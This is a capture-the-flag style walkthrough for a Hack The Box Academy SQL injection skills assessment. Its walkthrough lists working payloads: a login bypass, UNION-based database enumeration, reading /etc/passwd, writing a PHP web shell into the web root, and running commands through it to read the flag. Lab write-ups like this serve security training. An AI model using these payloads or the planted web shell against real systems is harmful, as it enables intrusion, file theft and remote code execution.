# Skills Assessment - SQL Injection Fundamentals

The company `Inlanefreight` has contracted you to perform a web application assessment against one of their public-facing websites. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.

They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.

![image](https://academy.hackthebox.com/storage/modules/33/sqli\_skills.png)

Find the vulnerabilities and submit a final flag using the skills we covered to complete this module. Don't forget to think outside the box!

## Walkthrough

Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

```sql
' or 1=1 limit 1 -- -+

cn' UNION select 1,2,3,4,5-- -
cn' UNION select 1,@@version,3,4,5-- -
cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- -

cn' UNION SELECT 1, user(), 3, 4, 5-- -
cn' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user WHERE user="root"-- -
cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -
cn' union select 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt'-- -
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'-- -
http://94.237.48.205:48962/dashboard/shell.php?0=id
http://94.237.48.205:48962/dashboard/shell.php?0=ls%20%2F
http://94.237.48.205:48962/dashboard/shell.php?0=cat%20%2Fflag_cae1dadcd174.txt%20
```
